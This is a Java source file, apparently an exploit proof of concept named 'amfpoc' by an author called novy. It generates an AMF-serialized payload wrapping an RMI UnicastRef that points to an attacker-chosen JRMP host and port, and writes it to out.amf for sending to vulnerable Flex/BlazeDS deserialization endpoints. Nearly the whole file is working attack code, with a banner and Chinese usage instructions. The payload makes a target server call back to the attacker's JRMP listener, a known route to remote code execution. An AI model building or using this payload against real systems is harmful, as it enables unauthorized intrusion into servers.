import flex.messaging.io.SerializationContext;
import flex.messaging.io.amf.*;

import java.io.*;

/**
 * @Author novy
 * @Date 2022/6/1 11:45
 * @Version 1.0
 */
public class AMF_JRMP {
    public static void main(String[] args) throws Exception {
        String text = "" +
                "\n" +
                " _______  __    __  .______     ______   \n" +
                "|   ____||  |  |  | |   _  \\   /  __  \\  \n" +
                "|  |__   |  |  |  | |  |_)  | |  |  |  | \n" +
                "|   __|  |  |  |  | |   ___/  |  |  |  | \n" +
                "|  |     |  `--'  | |  |      |  `--'  | \n" +
                "|__|      \\______/  | _|       \\______/  \n" +
                "by novy                                      \n\n";
        System.out.println(text);
        String help = "java -jar amfpoc.jar 0.0.0.0 1234";
        if (args.length==0){
            System.out.println("请输入完整的参数:java -jar amfpoc.jar 启动jrmp服务的ip 启动jrmp服务的端口\ne,g：\n\n"+help);
            System.exit(0);
        }
        if (args[0]==null){
            System.out.println("请输入已经启动jrmp服务的ip");
        }
        if (args[1]==null){
            System.out.println("请输入已经启动jrmp服务的端口");
        }
        Object object = generateUnicastRef(args[0], Integer.parseInt(args[1]));//jrmp启动地址、端口
        byte[] amf = serialize(object);

        //生成数据
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        out.write(amf);
        FileOutputStream fileOutputStream = new FileOutputStream( new File("out.amf"));
        out.writeTo(fileOutputStream) ;
        out.flush();
        System.out.println("在当前目录生成out.amf成功！");

    }
    public static Object generateUnicastRef(String host, int port) throws Exception {
        java.rmi.server.ObjID objId = new java.rmi.server.ObjID();
        sun.rmi.transport.tcp.TCPEndpoint endpoint = new sun.rmi.transport.tcp.TCPEndpoint(host, port);
        sun.rmi.transport.LiveRef liveRef = new sun.rmi.transport.LiveRef(objId, endpoint, false);
        return new sun.rmi.server.UnicastRef(liveRef);
    }
    public static byte[] serialize(Object data) throws IOException {
        MessageBody body = new MessageBody();
        body.setData(data);
        ActionMessage message = new ActionMessage();
        message.addBody(body);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        AmfMessageSerializer serializer = new AmfMessageSerializer();
        serializer.initialize(SerializationContext.getSerializationContext(), out, null);
        serializer.writeMessage(message);
        return out.toByteArray();
    }

    //用来验证
    public static ActionMessage deserialize(byte[] amf) throws ClassNotFoundException, IOException {
        ByteArrayInputStream in = new ByteArrayInputStream(amf);
        AmfMessageDeserializer deserializer = new AmfMessageDeserializer();
        deserializer.initialize(SerializationContext.getSerializationContext(), in, null);
        ActionMessage actionMessage = new ActionMessage();
        deserializer.readMessage(actionMessage, new ActionContext());
        return actionMessage;
    }
}
